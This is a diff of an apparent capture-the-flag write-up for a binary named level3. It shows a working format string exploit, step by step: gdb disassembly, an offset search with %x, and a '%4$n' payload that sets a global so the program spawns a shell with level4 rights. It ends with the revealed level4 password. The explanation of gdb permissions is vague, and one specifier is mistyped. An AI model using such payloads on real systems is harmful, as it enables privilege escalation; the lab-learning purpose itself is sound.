@@ -7,7 +7,7 @@ void v(void)
   
   fgets(local_20c,0x200,stdin); ---> 0x200 = 512 : max size of the buffer
   printf(local_20c);
-  if (m == 0x40) {
+  if (m == 0x40) { --> 0x40 = 64
     fwrite("Wait what?!\n",1,0xc,stdout);
     system("/bin/sh");
   }
@@ -15,11 +15,103 @@ void v(void)
 }
 
 void main(void)
-
 {
   v();
   return;
 }
 
+This fgets seems to not be vulnerable to buffer overflow because the size of the buffer is 512 and the size of the input is 512.
+But we see that we can start a shell if we set m to 64. system("/bin/sh");
 
-// We see that fgets is vulnerable to buffer overflow, so we can exploit it, because local_20c is 520 bytes and fgets read .
+gdb ./level3
+disass v
+Dump of assembler code for function v:
+   0x080484a4 <+0>:	push   %ebp
+   0x080484a5 <+1>:	mov    %esp,%ebp
+   0x080484a7 <+3>:	sub    $0x218,%esp
+   0x080484ad <+9>:	mov    0x8049860,%eax
+   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
+   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
+   0x080484be <+26>:	lea    -0x208(%ebp),%eax
+   0x080484c4 <+32>:	mov    %eax,(%esp)
+   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
+   0x080484d2 <+46>:	mov    %eax,(%esp)
+   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
+   0x080484da <+54>:	mov    0x804988c,%eax
+   0x080484df <+59>:	cmp    $0x40,%eax
+   0x080484e2 <+62>:	jne    0x8048518 <v+116>
+   0x080484e4 <+64>:	mov    0x8049880,%eax
+   0x080484e9 <+69>:	mov    %eax,%edx
+   0x080484eb <+71>:	mov    $0x8048600,%eax
+   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
+   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
+   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
+   0x08048504 <+96>:	mov    %eax,(%esp)
+   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
+   0x0804850c <+104>:	movl   $0x804860d,(%esp)
+   0x08048513 <+111>:	call   0x80483c0 <system@plt>
+   0x08048518 <+116>:	leave  
+   0x08048519 <+117>:	ret
+
+(gdb) b *0x080484df
+(gdb) run
+Starting program: /home/user/level3/level3 
+salut
+salut
+Breakpoint 1, 0x080484df in v ()
+(gdb) set $eax = 64
+(gdb) s
+Single stepping until exit from function v,
+which has no line number information.
+Wait what?!
+$ cat /home/user/level4/.pass                        
+cat: /home/user/level4/.pass: Permission denied
+$ whoami
+level3
+
+Hmmmmm we can t read the password of level4 because we are level3. We need to find another way to read it.
+Why ?
+When you change the value of the variable m using GDB and manipulate it to be equal to 0x40, you are forcing the program to execute the code within the if block and call the system("/bin/sh") command. This allows you to spawn a shell.
+However, the permissions and privileges associated with the spawned shell are determined by the context in which the program is executed. When you run the program normally (without GDB), it is executed within the context of your user account. As a result, the spawned shell inherits your user permissions and privileges.
+On the other hand, when you run the program within GDB, it may execute within a different context or under different permissions. GDB itself may have its own restrictions on spawning a shell or accessing certain system resources. Therefore, the permissions and privileges associated with the spawned shell in the GDB environment may be different from those when you execute the program directly.
+In summary, the difference in permissions between running the program with GDB and running it directly is likely due to the different execution contexts and the permissions associated with those contexts.
+
+So we an another possibility to enter in the if condition with the rights of level4.
+printf(local_20c); --> Printf is vulnerable to format string attack, we can use it to change the value of m. Because we can put everything we want in fgets function and printf function dont check the type of the variable so we can do some attack.
+We can use multiple %x to print the hex value of the address in the stack. (https://web.ecs.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf)
+We have to find the address of m in the stack. We can use objdump -t to find it.
+
+We find the good line : 0804988c g     O .bss	00000004              m --> 0x0804988c
+Perfect we have the address of m.
+Now we have to find the offset between the address of m and the address of the buffer so we can change the value of m.
+We are going to print the stack with %x and we will see a repetition of the same value AAAA (in the ascii table A = 41 --> hexa), the next address will be the address of m. After that we just have to count the number of %x to find the offset.
+
+python -c 'print "AAAA" + "|%08x" * 8' | ./level3
+AAAA|00000200|b7fd1ac0|b7ff37d0|41414141|3830257c|30257c78|257c7838|7c783830
+
+Addresses are separated by | and the address of m is after 41414141 (AAAA), We count 4 %x so the offset is 4.
+
+Now we have the address of m and the offset so we can change the value of m to 64 and start a shell.
+1) Convert the address of m in little endian : \x8c\x98\x04\x08
+
+2) We have to use %n to write the number of characters written by printf into the variable m. We have to write 64 characters so 60 times A + little endian (= 4 bites)
+So we can use %n ('https://www.geeksforgeeks.org/g-fact-31/') operator to count the number of characters written by printf and write it in m.
+So using %4x$n we can write 64 characters in the fourth block of memory which is the m address.
+%: It indicates the start of a format specifier in a format string.
+4: It specifies the argument index to be used for the format specifier. In this case, it is 4, indicating that it will use the fourth argument passed to the printf function.
+$: It separates the argument index from the format specifier.
+n: It is the format specifier that causes printf to write the number of characters printed so far into the memory location specified by the argument.
+
+3) use python to feed the program with the good input like, keep open stdin with cat and the pipe all of this into ./level3 like in the previous level :
+(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' ; cat) | ./level3
+?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+
+4) Check if we have the right of level4 :
+whoami
+level4
+
+5) Perfect we have the right so we can read the password :
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
